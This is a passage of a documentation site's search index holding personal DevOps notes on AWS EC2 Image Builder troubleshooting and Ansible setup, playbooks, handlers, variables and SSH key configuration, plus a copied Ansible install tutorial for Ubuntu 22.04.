-recurse<code>to avoid the build choking on</code>(x86)` as being a command. I've always scratched my head at the parens in that directory name and it's variable reference - but this could happen in other areas as well.  Use single quotes when you can to avoid undesirable attempted expansions.</li> <li>The AWS component for PowerShell Core is using version 6.x, this automation uses chocolatey to install the latest (7.1.x as of this writing)</li> <li>The AWS shutdown process clears out non-default folders from c:\\ - so installing software here is not adviseable.</li> <li>Seperate \"Test\" Components are important in Windows for at least these reasons:</li> <li>Sysprep is run by EC2 Image Builder (after \"validate\" steps of an install component) and there is a small possibility it may affect the operation of some software.</li> <li>AWS cleans out any folders at the root of c:\\ - a test stage will catch the mistake of installing something there.</li> <li>Many software installations that update the system path do not work correctly until after a reboot - the Test components run on a fresh boot off of the Image Builder created AMI - so doing the tests at this time allows proper validation of any configuration requiring a reboot to valudate correctly.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/#bigger-gotcha-hanging-sysprep","title":"Bigger Gotcha: Hanging Sysprep","text":"<p>AWS does not provide a reboot component during BUILD, yet SYSPREP will hang if the system is \"reboot pending DUE TO windows updates\".  With complex CI build agent dependencies like those in windows-same-as-gitlab-com.yml, the situation of having run Windows updates that cause a pending reboot will be frequent.</p> <p>To diagnose this situation (or other sysprep hangs),  1. SSM into the machine being built (it will be hanging in \"Building\" mode for way longer than expected) 2. Do <code>get-process sysprep</code> to see if sysprep is still running 3. Even if Sysprep is not still running, review the contents of <code>C:\\Windows\\system32\\sysprep\\panther\\setupact.log</code></p> <p>The root cause error for the common condition of a windows update pending reboot says \"Sysprep_Clean_Validate_0pk:There are one or more Windows updates that require a reboot. To run Sysprep, reboot the computer and restart the application.[gle=0x000036b7]</p> <p>IMPORTANT: The biggest challenge to this problem is that it's emergence will be completely dynamic.  It can happen on Windows 2016 on month and 2019 the next. This is because of the patch level of the AMI when you get it and the fact that Visual Studio and DotNet SDKs and runtimes dynamically apply patches that are relvant to the current situation*.  Therefore, creating a stable build that also uses the latest of the build tools and SDK requires dynamic, only if needed reboots.</p> <p>To help with this you can use the enclosed component windows-reboot-if-needed.yml. This experimental component can detect if a reboot is pending for any one of six different \"reboot pending\" markers in Windows and do a delayed one **only if needed*. EC2 Image Builder picks up on the 3010 exit code and reliably reboots and restarts where it left off.</p> <p>NOTE: Sysprep has this odd non-exiting error hang for other reasons as well - so this troubleshooting information may apply to other situations.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/#gitlab-runner-requirements","title":"GitLab Runner Requirements","text":"<ul> <li>The EC2 Image Builder recipe must include the AWS prepared \"Chocolatey\" component and it must be sequenced before the component in this documentation.</li> <li>GitLab Runner assumes PowerShell Core (pwsh.exe) is on the path for Windows machines - so the AWS prepared \"PowerShell Core\" component must be installed (order is not important) for GitLab runner to run PowerShell scripts in gitlab-ci.yml. If you need Windows PowerShell you can call it from an initial PowerShell Core script.</li> <li>Visual studio build tools require a volume much larger than the AWS Windows default of 30GB - but it is hard to diagnose when you run out spaces during EC2 Image Builder builds - so pick a value larger that Visual Studio and with plenty of scratch space - 500-750GB should do it - you might be able to tune that value to be lower depending on your build.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/ec2-image-builder/#ec2-image-builder-files","title":"EC2 Image Builder Files","text":"<ul> <li>windows-netframework4-component.yml - builds a runner specifically for being able to build a .NET 4.5 version of nopcommerce.</li> <li>windows-same-as-gitlab-com.yml - mimics the Windows runner configuration used on GitLab.com. Configuration information is here.</li> <li>windows-reboot-if-needed.yml - This experimental component can detect if a reboot is pending for any one of six different \"reboot pending\" markers in Windows and do a delayed one **only if needed*.  EC2 Image Builder picks up on the 3010 exit code and reliably reboots and restarts where it left off.</li> <li>userdata.ps1 - the userdata snippet required in an EC2 Image Builder Recipe so that EC2 Image Builder can run commands to install software.</li> </ul>"},{"location":"Ansible/Ansible-01/","title":"Ansible","text":"<ul> <li>Funciona por m\u00f3dulos</li> <li>Galaxy es un repositorio de Ansible</li> <li>Funciona con Python</li> <li>Funciona en sistemas basados en Unix</li> <li>Se puede utilizar con Windows Server</li> <li>S\u00f3lo tienes que instalar el software en tu ordenador, sin necesidad de configurar servidores intermedios</li> <li>Ansible es Software Libre GPL3 </li> </ul>"},{"location":"Ansible/Ansible-01/#instalar","title":"Instalar","text":""},{"location":"Ansible/Ansible-01/#habilitar-conexion-por-claves-ssh","title":"Habilitar conexion por claves SSH","text":"<p>Nos vendr\u00e1 bien para que no pida el pass continuamente</p> <p>Se puede usar un Cert sin contrase\u00f1a</p> <pre><code># Crear la SSH Key  \nssh-keygen\n\n# Generating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa):\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\n#Your identification has been saved in /root/.ssh/id_rsa\n#Your public key has been saved in /root/.ssh/id_rsa.pub\n#The key fingerprint is:\n#SHA256:JMg6QcgI..... root@....\nThe key's randomart image is:\n+---[RSA 3072]----+\n|B+A=o            |\n|OB+Ao+           |\n       ...\n|+ ..             |\n| E ..            |\n+----[SHA256]-----+\n</code></pre> <p>Hay que subir el Public Key <code>/root/.ssh/id_rsa.pub</code> al servidor</p> <pre><code>ssh-copy-id -i /root/.ssh/id_rsa.pub user@coin-gateway.com\n# Type remote user password\n</code></pre> <pre><code>ssh coin-gateway.com\neval $(ssh-agent)\nssh add\n\n# Ver la versi\u00f3n de Linux\ncat /etc/lsb-release\n</code></pre>"},{"location":"Ansible/Ansible-01/#install-ansible","title":"Install Ansible","text":"<pre><code>sudo add-apt-repository ppa:ansible/ansible\n\n\npython -m pip -V\n\npython -m pip install --user ansible\npython -m pip install --user argcomplete\n</code></pre>"},{"location":"Ansible/Ansible-01/#tareas-de-ansible","title":"Tareas de Ansible","text":"<p>Palabros chungos:</p> <ul> <li>Invertory</li> <li>Donde listar cada uno de los Hosts a aprovisionar</li> <li>Configurar el Inventory Global editando el archivo hosts.<ul> <li>Podemos usar grupos poniendo etiqueta  entre una corchetes </li> </ul> </li> </ul> <pre><code>nano /etc/ansible/hosts\n\n# Ejemplo\ndomains.com\n8.8.8.8\n\n# GOUPS en corchetes\n[webserver]\nnodo1.coin-gateway.com\nnodo2.coin-gateway.com\n127.0.0.1\n\n[dbservers]\ndb1.coin-gateway.com\ndb2.coin-gateway.com\n127.0.0.2\n</code></pre>"},{"location":"Ansible/Ansible-01/#tasks","title":"Tasks","text":"<p>De manera declarativa, no ponemos comandos. Le decimos como deber\u00eda quedar el sistema cuando termine el aprovisionamiento.</p> <p>Cuando hagamos playbooks, donde le decimos que ha de tener instalado y que datos necesita.</p> <p>Si le decimos que instale Nginx y no est\u00e1 instalado, lo instala.</p>"},{"location":"Ansible/Ansible-01/#comandos","title":"Comandos","text":"<p>Comandos elemntales, para comprobar que todo va correctamente</p> <pre><code># Verifica Host conectado\n# A maquinas del inventario\nansible user@coin-gateway.com -m ping\n# Con tu propia lista de hosts\nansible user@coin-gateway.com -m ping -i hosts.txt\n</code></pre>"},{"location":"Ansible/Ansible-02-commands/","title":"Ansible-02","text":""},{"location":"Ansible/Ansible-02-commands/#comandos-en-un-servidor-remoto","title":"Comandos en un servidor remoto:","text":"<pre><code># My Host\nexport HOST=\"user@coin-gateway.com\"\n# Connect to the Host\nssh $HOST\n# En Consola\necho \"hola\"\n# Con Ansible\nansible $HOST -a 'echo \"hola\"'\n</code></pre>"},{"location":"Ansible/Ansible-02-commands/#usando-modulos","title":"Usando m\u00f3dulos","text":"<pre><code># APT con sudo\n# Para sudo --&gt; -b (Become)\n# Para Pass --&gt; -K\n\nansible $HOST -m apt -a 'name=vim state=present' -b -K\n</code></pre> <p>Cuando lanzas comandos con <code>ansible</code> los ejecuta con el usuario <code>(whoami)</code></p> <pre><code># Lanzar comando con otro user\nansible -i hosts.txt middlepay.zent.cash -m ping -u user\n</code></pre>"},{"location":"Ansible/Ansible-02-commands/#module-categories","title":"Module Categories","text":"<ul> <li>All modules</li> <li>Cloud modules</li> <li>Clustering modules</li> <li>Commands modules</li> <li>Crypto modules</li> <li>Database modules</li> <li>Files modules</li> <li>Identity modules</li> <li>Inventory modules</li> <li>Messaging modules</li> <li>Monitoring modules</li> <li>Net Tools modules</li> <li>Network modules</li> <li>Notification modules</li> <li>Packaging modules</li> <li>Remote Management modules</li> <li>Source Control modules</li> <li>Storage modules</li> <li>System modules</li> <li>Utilities modules</li> <li>Web Infrastructure modules</li> <li>Windows modules</li> </ul>"},{"location":"Ansible/Ansible-03-playbook/","title":"Ansible Playbooks","text":"<p>Usamos YAML</p> <p>editamos el fichero sites.yml</p> <pre><code>---\n- hosts: user@coin-gateway.com\n  # become: yes\n  # remote_user: root\n  tasks:\n  - name: Install dependencies\n    apt: name={{ item }} state=present\n    become: yes\n  - name: saluda\n    shell: echo hola\n</code></pre> <p>Con <code>ansible-playbook site.yml -K</code> </p> <pre><code>ansible-playbook -i hosts playbook.yml --key-file \"~/.ssh/mykey.pem\"\n</code></pre>"},{"location":"Ansible/Ansible-03-playbook/#servicios","title":"Servicios","text":"<p>https://docs.ansible.com/ansible/2.9/modules/service_module.html#service-manage-services</p> <ul> <li>Controla los servicios en hosts remotos.</li> <li>Para Windows targets, usa win_service</li> </ul>"},{"location":"Ansible/Ansible-03-playbook/#examples","title":"Examples","text":"<pre><code>---\n- hosts: user@coin-gateway.com\n  # become: yes\n  tasks:\n  - name: dependencies\n    #apt: name={{ item }} state=present\n    apt: name=nano state=present\n    become: yes\n  - name: saluda\n    shell: echo hola\n  - name: servicio\n    service: name=nginx state=stopped\n    become: yes\n</code></pre> <pre><code>- name: Start service httpd, if not started\n  service:\n    name: httpd\n    state: started\n\n- name: Stop service httpd, if started\n  service:\n    name: httpd\n    state: stopped\n\n- name: Restart service httpd, in all cases\n  service:\n    name: httpd\n    state: restarted\n\n- name: Reload service httpd, in all cases\n  service:\n    name: httpd\n    state: reloaded\n\n- name: Enable service httpd, and not touch the state\n  service:\n    name: httpd\n    enabled: yes\n\n- name: Start service foo, based on running process /usr/bin/foo\n  service:\n    name: foo\n    pattern: /usr/bin/foo\n    state: started\n\n- name: Restart network service for interface eth0\n  service:\n    name: network\n    state: restarted\n    args: eth0\n</code></pre> <pre><code>- hosts: 192.168.0.90\n  # become: yes\n  # remote_user: root\n  tasks:\n    - name: Install aptitude\n      apt:\n        name: aptitude\n        state: latest\n        update_cache: true\n\n    - name: Install required system packages\n      apt:\n        pkg:\n          - apt-transport-https\n          - ca-certificates\n          - curl\n          - software-properties-common\n          - python3-pip\n          - virtualenv\n          - python3-setuptools\n        state: latest\n        update_cache: true\n\n    - name: Add Docker GPG apt Key\n      apt_key:\n        url: https://download.docker.com/linux/ubuntu/gpg\n        state: present\n\n    - name: Add Docker Repository\n      apt_repository:\n        repo: deb https://download.docker.com/linux/ubuntu focal stable\n        state: present\n\n    - name: Update apt and install docker-ce\n      apt:\n        name: docker-ce\n        state: latest\n        update_cache: true\n\n    - name: Install Docker Module for Python\n      pip:\n        name: docker\n</code></pre> <pre><code>---\n- name: Do something that requires a reboot when it results in a change.\n  ...\n  register: task_result\n\n- name: Reboot immediately if there was a change.\n  shell: \"sleep 5 &amp;&amp; reboot\"\n  async: 1\n  poll: 0\n  when: task_result is changed\n\n- name: Wait for the reboot to complete if there was a change.\n  wait_for_connection:\n    connect_timeout: 20\n    sleep: 5\n    delay: 5\n    timeout: 300\n  when: task_result is changed\n</code></pre>"},{"location":"Ansible/Ansible-04-config-files/","title":"Ansible - Configuration Files","text":"<p>Changes can be made and used in a configuration file which will be searched for in the following order:</p> <ul> <li><code>ANSIBLE_CONFIG</code> (environment variable if set)</li> <li><code>ansible.cfg</code> (in the current directory)</li> <li><code>~/.ansible.cfg</code> (in the home directory)</li> <li><code>/etc/ansible/ansible.cfg</code></li> </ul>"},{"location":"Ansible/Ansible-04-config-files/#env-vars","title":"ENV VARS","text":"<pre><code>ANSIBLE_CONFIG\n</code></pre>"},{"location":"Ansible/Ansible-04-config-files/#config-files","title":"Config Files","text":"<p>Create basic config file</p> <pre><code>ansible-config init --disabled &gt; ansible.cfg\n</code></pre> <p>You can also have a more complete file that includes existing plugins:</p> <pre><code>ansible-config init --disabled -t all &gt; ansible.cfg\n</code></pre> <ul> <li><code>ansible.cfg</code></li> <li>Current Directory</li> <li>or <code>/etc/ansible/ansible.cfg</code></li> <li><code>.ansible.cfg</code></li> <li>Home Directory</li> </ul>"},{"location":"Ansible/Ansible-04-config-files/#examples","title":"Examples","text":"<pre><code>[defaults]\n# (string) Sets the login user for the target machines\n# When blank it uses the connection plugin's default, normally the user currently executing Ansible.\nremote_user=user\n</code></pre> <p>Now we can launch the ansible command without <code>-u user</code></p> <p><code>ansible -i hosts.txt coin-gateway.com -m ping</code></p> <p>or</p> <p><code>ANSIBLE_CONFIG=ansible2.cfg ansible -i hosts.txt coin-gateway.com -m ping</code></p>"},{"location":"Ansible/Ansible-04-config-files/#wsl-issues","title":"WSL Issues","text":"<p>[WARNING]: Ansible is being run in a world writable directory</p> <p>The problem is related to the permissions given to the files by default, as in fact the latest versions these permissions (777) as a security problem and ignore the file.</p> <p>To modify the permissions of the WSL by creating the file <code>/etc/wsl.conf</code></p> <pre><code>[Automount]\nenabled = true\nmountFsTab = false\nroot = /mnt/\noptions = \"metadata, umask = 22, fmask = 11\"\n\n[network]\ngenerateHosts = true\ngenerateResolvConf = true\n</code></pre> <p>Restart WSL</p> <pre><code>wsl --shutdown\n</code></pre> <p>Change folder permissions:</p> <pre><code>su myuser\nsudo chmod -R o-w ANSIBLE/\n</code></pre>"},{"location":"Ansible/Ansible-05-Handlers/","title":"Ansible Handlers","text":"<p>Permiten que cuando consiga correr una tarea lo notifique para lanzar otras cosas</p> <p>No corren de forma lineal aunque las declares en orden.</p> <p>Ejemplo:</p> <ul> <li>Instala Apache2</li> <li>Renicia el servidor</li> <li>Solo si la tarea anterior ha sido exitosa</li> <li>Si Apache ya estaba instalado, el handler no se ejecuta</li> </ul> <pre><code># Install Apache2 with Ansible\n---\n- hosts: middlepay.zent.cash\n  become: yes\n  tasks:\n    - name: install apache2\n      apt:\n        name: apache2\n        state: present\n        update_cache: yes\n      notify:\n        - start apache2\n  handlers:\n    - name: start apache2\n      service:\n        name: apache2\n        state: started\n        enabled: yes\n</code></pre>"},{"location":"Ansible/Ansible-06-Variables/","title":"Ansible 06 Variables","text":"<pre><code>---\n- hosts: middlepay.zent.cash\n  become: true\n  vars:\n    container_count: \"1\"\n    default_container_name: \"docker\"\n    default_container_image: \"ubuntu\"\n    default_container_command: \"sleep 1\"\n  tasks:\n  - name: Pull default Docker image\n    community.docker.docker_image:\n      name: \"{{ default_container_image }}\"\n      source: pull\n  - name: Create default containers\n    community.docker.docker_container:\n      name: \"{{ default_container_name }}{{ item }}\"\n      image: \"{{ default_container_image }}\"\n      command: \"{{ default_container_command }}\"\n      state: present\n    with_sequence: count={{ container_count }}\n</code></pre>"},{"location":"Ansible/Ansible-07-tricks/","title":"Ansible Notes (NO)","text":""},{"location":"Ansible/Ansible-07-tricks/#to-pass-password-not-recommended","title":"To pass password (not recommended)","text":"<p>Updated <code>ansible.cfp</code> </p> <p>My user is <code>user</code></p> <pre><code>become_allow_same_user=True\nbecome=True\nbecome_user=root\nremote_user=user\n</code></pre> <p>Now use this command:</p> <pre><code># Store your password:\nexport PASS=\"MyPass\"\n\n# Launch this command\nansible-playbook wapi.yml --extra-vars \"ansible_password=$PASS\"\n</code></pre>"},{"location":"Ansible/Ansible-08-sshkey/","title":"Specifying ssh key in ansible playbook file","text":"<p>Ansible playbook can specify the key used for ssh connection using <code>--key-file</code> on the command line.</p> <pre><code>ansible-playbook -i hosts playbook.yml --key-file \"~/.ssh/mykey.pem\"\n</code></pre> <p>Is it possible to specify the location of this key in playbook file instead of using <code>--key-file</code> on command line?</p> <p>Because I want to write the location of this key into a <code>var.yaml</code> file, which will be read by ansible playbook with <code>vars_files:</code>.</p> <p>The followings are parts of my configuration:</p> <p>vars.yml file</p> <pre><code>key1: ~/.ssh/mykey1.pem\nkey2: ~/.ssh/mykey2.pem\n</code></pre> <p>playbook.yml file</p> <pre><code>---\n\n- hosts: myHost\n  remote_user: ubuntu\n  key_file: {{ key1 }}  # This is not a valid syntax in ansible. Does there exist this kind of directive which allows me to specify the ssh key used for this connection?\n  vars_files:\n    - vars.yml\n  tasks:\n    - name: Echo a hello message\n      command: echo hello\n</code></pre> <p>I've tried adding <code>ansible_ssh_private_key_file</code> under <code>vars</code>. But it doesn't work on my machine.</p> <pre><code>vars_files:\n  - vars.yml\nvars:\n  ansible_ssh_private_key_file: \"{{ key1 }}\"\ntasks:\n  - name: Echo a hello message\n    command: echo hello\n</code></pre> <p>If I run <code>ansible-playbook</code> with the <code>playbook.yml</code> above. I got the following error:</p> <pre><code>TASK [Gathering Facts] ******************************************************************************************************************************\nUsing module file /usr/local/lib/python2.7/site-packages/ansible/modules/system/setup.py\n&lt;192.168.5.100&gt; ESTABLISH SSH CONNECTION FOR USER: ubuntu\n&lt;192.168.5.100&gt; SSH: EXEC ssh -C -o ControlMaster=auto -o ControlPersist=60s -o StrictHostKeyChecking=no -o KbdInteractiveAuthentication=no -o PreferredAuthentications=gssapi-with-mic,gssapi-keyex,hostbased,publickey -o PasswordAuthentication=no -o User=ubuntu -o ConnectTimeout=10 -o ControlPath=/Users/myName/.ansible/cp/2d18691789 192.168.5.100 '/bin/sh -c '\"'\"'echo ~ &amp;&amp; sleep 0'\"'\"''\n&lt;192.168.5.100&gt; (255, '', 'Permission denied (publickey).\\r\\n')\nfatal: [192.168.5.100]: UNREACHABLE! =&gt; {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: Permission denied (publickey).\\r\\n\",\n    \"unreachable\": true\n}\n    to retry, use: --limit @/Users/myName/playbook.retry\n</code></pre> <ul> <li>in the inventory file:</li> </ul> <p><code>myHost ansible_ssh_private_key_file=~/.ssh/mykey1.pem   myOtherHost ansible_ssh_private_key_file=~/.ssh/mykey2.pem</code></p> <ul> <li>in the <code>host_vars</code>:</li> </ul> <p>```   # host_vars/myHost.yml   ansible_ssh_private_key_file: ~/.ssh/mykey1.pem</p> <p># host_vars/myOtherHost.yml   ansible_ssh_private_key_file: ~/.ssh/mykey2.pem   ```</p> <ul> <li> <p>in a <code>group_vars</code> file if you use the same key for a group of hosts</p> </li> <li> <p>in the <code>vars</code> section of an entry in a play:</p> </li> </ul> <p><code>yaml   - hosts: myHost      remote_user: ubuntu      vars_files:        - vars.yml      vars:        ansible_ssh_private_key_file: \"{{ key1 }}\"      tasks:        - name: Echo a hello message          command: echo hello</code></p> <ul> <li>in setting a fact in a play entry (task):</li> </ul> <p><code>yaml   - name: 'you name it'      ansible.builtin.set_fact:        ansible_ssh_private_key_file: \"{{ key1 }}\"</code></p> <p>You can use the ansible.cfg file, it should look like this (There are other parameters which you might want to include):</p> <pre><code>[defaults]\ninventory = &lt;PATH TO INVENTORY FILE&gt;\nremote_user = &lt;YOUR USER&gt;\nprivate_key_file =  &lt;PATH TO KEY_FILE&gt;\n</code></pre> <pre><code>ansible-playbook -i hosts playbook.yml --key-file \"~/.ssh/mykey.pem\"\n</code></pre>"},{"location":"Ansible/install/","title":"How To Install and Configure Ansible on Ubuntu 22.04","text":"<p>Published on April 26, 2022 \u00b7 Updated on October 8, 2022</p> <ul> <li>Ansible</li> <li>Configuration Management</li> <li>Ubuntu 22.04</li> <li>Ubuntu</li> </ul> <p></p> <p>By Erika Heidi and Jamon Camisso</p> <p></p>"},{"location":"Ansible/install/#not-using-ubuntu-2204choose-a-different-version-or-distribution","title":"Not using Ubuntu 22.04?Choose a different version or distribution.","text":"<p>Ubuntu 22.04</p>"},{"location":"Ansible/install/#introduction","title":"Introduction","text":"<p>Configuration management systems are designed to streamline the process of controlling large numbers of servers, for administrators and operations teams. They allow you to control many different systems in an automated way from one central location.</p> <p>While there are many popular configuration management tools available for Linux systems, such as Chef and Puppet, these are often more complex than many people want or need. Ansible is a great alternative to these options because it offers an architecture that doesn\u2019t require special software to be installed on nodes, using SSH to execute the automation tasks and YAML files to define provisioning details.</p> <p>In this guide, we\u2019ll discuss how to install Ansible on an Ubuntu 22.04 server and go over some basics of how to use this software. For a more high-level overview of Ansible as configuration management tool, please refer to An Introduction to Configuration Management with Ansible.</p>"},{"location":"Ansible/install/#prerequisites","title":"Prerequisites","text":"<p>To follow this tutorial, you will need:</p> <ul> <li>One Ansible Control Node: The Ansible control node is the machine we\u2019ll use to connect to and control the Ansible hosts over SSH. Your Ansible control node can either be your local machine or a server dedicated to running Ansible, though this guide assumes your control node is an Ubuntu 22.04 system. Make sure the control node has:</li> <li>A non-root user with sudo privileges. To set this up, you can follow Steps 2 and 3 of our Initial Server Setup Guide for Ubuntu 22.04. However, please note that if you\u2019re using a remote server as your Ansible Control node, you should follow every step of this guide. Doing so will configure a firewall on the server with <code>ufw</code> and enable external access to your non-root user profile, both of which will help keep the remote server secure.</li> <li>An SSH keypair associated with this user. To set this up, you can follow Step 1 of our guide on How to Set Up SSH Keys on Ubuntu 22.04.</li> <li>One or more Ansible Hosts: An Ansible host is any machine that your Ansible control node is configured to automate. This guide assumes your Ansible hosts are remote Ubuntu 22.04 servers. Make sure each Ansible host has:</li> <li>The Ansible control node\u2019s SSH public key added to the <code>authorized_keys</code> of a system user. This user can be either root or a regular user with sudo privileges. To set this up, you can follow Step 2 of How to Set Up SSH Keys on Ubuntu 22.04.</li> </ul>"},{"location":"Ansible/install/#step-1-installing-ansible","title":"Step 1 \u2014 Installing Ansible","text":"<p>To begin using Ansible as a means of managing your server infrastructure, you need to install the Ansible software on the machine that will serve as the Ansible control node.</p> <p>From your control node, run the following command to include the official project\u2019s PPA (personal package archive) in your system\u2019s list of sources:</p> <pre><code>sudo apt-add-repository ppa:ansible/ansible\n</code></pre> <p>Copy</p> <p>Press <code>ENTER</code> when prompted to accept the PPA addition.</p> <p>Next, refresh your system\u2019s package index so that it is aware of the packages available in the newly included PPA:</p> <pre><code>sudo apt update\n</code></pre> <p>Copy</p> <p>Following this update, you can install the Ansible software with:</p> <pre><code>sudo apt install ansible\n</code></pre> <p>Copy</p> <p>Your Ansible control node now has all of the software required to administer your hosts. Next, we will go over how to add your hosts to the control node\u2019s inventory file so that it can control them.</p>"},{"location":"Ansible/install/#step-2-setting-up-the-inventory-file","title":"Step 2 \u2014 Setting Up the Inventory File","text":"<p>The inventory file contains information about the hosts you\u2019ll manage with Ansible. You can include anywhere from one to several hundred servers in your inventory file, and hosts can be organized into groups and subgroups. The inventory file is also often used to set variables that will be valid only for specific hosts or groups, in order to be used within playbooks and templates. Some variables can also affect the way a playbook is run, like the <code>ansible_python_interpreter</code> variable that we\u2019ll see in a moment.</p> <p>To edit the contents of your default Ansible inventory, open the <code>/etc/ansible/hosts</code> file using your text editor of choice, on your Ansible control node:</p> <pre><code>sudo nano /etc/ansible/hosts\n</code></pre> <p>Copy</p> <p>Note: Although Ansible typically creates a default inventory file at <code>etc/ansible/hosts</code>, you are free to create inventory files in any location that better suits your needs. In this case, you\u2019ll need to provide the path to your custom inventory file with the <code>-i</code> parameter when running Ansible commands and playbooks. Using per-project inventory files is a good practice to minimize the risk of running a playbook on the wrong group of servers.</p> <p>The default inventory file provided by the Ansible installation contains a number of examples that you can use as references for setting up your inventory. The following example defines a group named <code>[servers]</code> with three different servers in it, each identified by a custom alias: server1, server2, and server3. Be sure to replace the highlighted IPs with the IP addresses of your Ansible hosts.</p> <p>/etc/ansible/hosts</p> <pre><code>[servers]\nserver1 ansible_host=203.0.113.111\nserver2 ansible_host=203.0.113.112\nserver3 ansible_host=203.0.113.113\n\n[all:vars]\nansible_python_interpreter=/usr/bin/python3\n</code></pre> <p>The <code>all:vars</code> subgroup sets the <code>ansible_python_interpreter</code> host parameter that will be valid for all hosts included in this inventory. This parameter makes sure the remote server uses the <code>/usr/bin/python3</code> Python 3 executable instead of <code>/usr/bin/python</code> (Python 2.7), which is not present on recent Ubuntu versions.</p> <p>When you\u2019re finished, save and close the file by pressing <code>CTRL+X</code> then <code>Y</code> and <code>ENTER</code> to confirm your changes.</p> <p>Whenever you want to check your inventory, you can run:</p> <pre><code>ansible-inventory --list -y\n</code></pre> <p>Copy</p> <p>You\u2019ll see output similar to this, but containing your own server infrastructure as defined in your inventory file:</p> <pre><code>Outputall:\n  children:\n    servers:\n      hosts:\n        server1:\n          ansible_host: 203.0.113.111\n          ansible_python_interpreter: /usr/bin/python3\n        server2:\n          ansible_host: 203.0.113.112\n          ansible_python_interpreter: /usr/bin/python3\n        server3:\n          ansible_host: 203.0.113.113\n          ansible_python_interpreter: /usr/bin/python3\n    ungrouped: {}\n</code></pre> <p>Now that you\u2019ve configured your inventory file, you have everything you need to test the connection to your Ansible hosts.</p>"},{"location":"Ansible/install/#step-3-testing-connection","title":"Step 3 \u2014 Testing Connection","text":"<p>After setting up the inventory file to include your servers, it\u2019s time to check if Ansible is able to connect to these servers and run commands via SSH.</p> <p>For this guide, we\u2019ll be using the Ubuntu root account because that\u2019s typically the only account available by default on newly created servers. If your Ansible hosts already have a regular sudo user created, you are encouraged to use that account instead.</p> <p>You can use the <code>-u</code> argument to specify the remote system user. When not provided, Ansible will try to connect as your current system user on the control node.</p> <p>From your local machine or Ansible control node, run:</p> <pre><code>ansible all -m ping -u root\n</code></pre> <p>Copy</p> <p>This command will use Ansible\u2019s built-in <code>ping</code> module to run a connectivity test on all nodes from your default inventory, connecting as root. The <code>ping</code> module will test:</p> <ul> <li>if hosts are accessible;</li> <li>if you have valid SSH credentials;</li> <li>if hosts are able to run Ansible modules using Python.</li> </ul> <p>You should get output similar to this:</p> <pre><code>Outputserver1 | SUCCESS =&gt; {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\nserver2 | SUCCESS =&gt; {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\nserver3 | SUCCESS =&gt; {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n</code></pre> <p>If this is the first time you\u2019re connecting to these servers via SSH, you\u2019ll be asked to confirm the authenticity of the hosts you\u2019re connecting to via Ansible. When prompted, type <code>yes</code> and then hit <code>ENTER</code> to confirm.</p> <p>Once you get a <code>\"pong\"</code> reply back from a host, it means you\u2019re ready to run Ansible commands and playbooks on that server.</p> <p>Note: If you are unable to get a successful response back from your servers, check our Ansible Cheat Sheet Guide for more information on how to run Ansible commands with different connection options.</p>"},{"location":"Ansible/install/#step-4-running-ad-hoc-commands-optional","title":"Step 4 \u2014 Running Ad-Hoc Commands (Optional)","text":"<p>After confirming that your Ansible control node is able to communicate with your hosts, you can start running ad-hoc commands and playbooks on your servers.</p> <p>Any command that you would normally execute on a remote server over SSH can be run with Ansible on the servers specified in your inventory file. As an example, you can check disk usage on all servers with:</p> <pre><code>ansible all -a \"df -h\" -u root\n</code></pre> <p>Copy</p> <pre><code>Output\nserver1 | CHANGED | rc=0 &gt;&gt;\nFilesystem      Size  Used Avail Use% Mounted on\nudev            3.9G     0  3.9G   0% /dev\ntmpfs           798M  624K  798M   1% /run\n/dev/vda1       155G  2.3G  153G   2% /\ntmpfs           3.9G     0  3.9G   0% /dev/shm\ntmpfs           5.0M     0  5.0M   0% /run/lock\ntmpfs           3.9G     0  3.9G   0% /sys/fs/cgroup\n/dev/vda15      105M  3.6M  101M   4% /boot/efi\ntmpfs           798M     0  798M   0% /run/user/0\n\nserver2 | CHANGED | rc=0 &gt;&gt;\nFilesystem      Size  Used Avail Use% Mounted on\nudev            2.0G     0  2.0G   0% /dev\ntmpfs           395M  608K  394M   1% /run\n/dev/vda1        78G  2.2G   76G   3% /\ntmpfs           2.0G     0  2.0G   0% /dev/shm\ntmpfs           5.0M     0  5.0M   0% /run/lock\ntmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup\n/dev/vda15      105M  3.6M  101M   4% /boot/efi\ntmpfs           395M     0  395M   0% /run/user/0\n\n...\n</code></pre> <p>The highlighted command <code>df -h</code> can be replaced by any command you\u2019d like.</p> <p>You can also execute Ansible modules via ad-hoc commands, similarly to what we\u2019ve done before with the <code>ping</code> module for testing connection. For example, here\u2019s how we can use the <code>apt</code> module to install the latest version of <code>vim</code> on all the servers in your inventory:</p> <pre><code>ansible all -m apt -a \"name=vim state=latest\" -u root\n</code></pre> <p>Copy</p> <p>You can also target individual hosts, as well as groups and subgroups, when running Ansible commands. For instance, this is how you would check the <code>uptime</code> of every host in the <code>servers</code> group:</p> <pre><code>ansible servers -a \"uptime\" -u root\n</code></pre> <p>Copy</p> <p>We can specify multiple hosts by separating them with colons:</p> <pre><code>ansible server1:server2 -m ping -u root\n</code></pre> <p>Copy</p> <p>For more information on how to use Ansible, including how to execute playbooks to automate server setup, you can check our Ansible Reference Guide.</p>"},{"location":"Ansible/install/#conclusion","title":"Conclusion","text":"<p>In this guide, you\u2019ve installed Ansible and set up an inventory file to execute ad-hoc commands from an Ansible Control Node.</p> <p>Once you\u2019ve confirmed you\u2019re able to connect and control your infrastructure from a central Ansible controller machine, you can execute any command or playbook you desire on those hosts.</p> <p>For more information on how to use Ansible, check out our Ansible Cheat Sheet Guide.</p>"},{"location":"Ansible%20Semaphore/","title":"Ansible Semaphore","text":"<p>Ansible Semaphore is a modern UI for Ansible. It lets you easily run Ansible playbooks, get notifications about fails, control access to deployment system.</p> <p>If your project has grown and deploying from the terminal is no longer for you then Ansible Semaphore is what you need.</p> <p></p>"},{"location":"Ansible%20Semaphore/#installation","title":"Installation","text":""},{"location":"Ansible%20Semaphore/#full-documentation","title":"Full documentation","text":"<p>https://docs.ansible-semaphore.com/administration-guide/installation</p>"},{"location":"Ansible%20Semaphore/#snap","title":"Snap","text":"<pre><code>sudo snap install semaphore\nsudo semaphore user add --admin --name \"Your Name\" 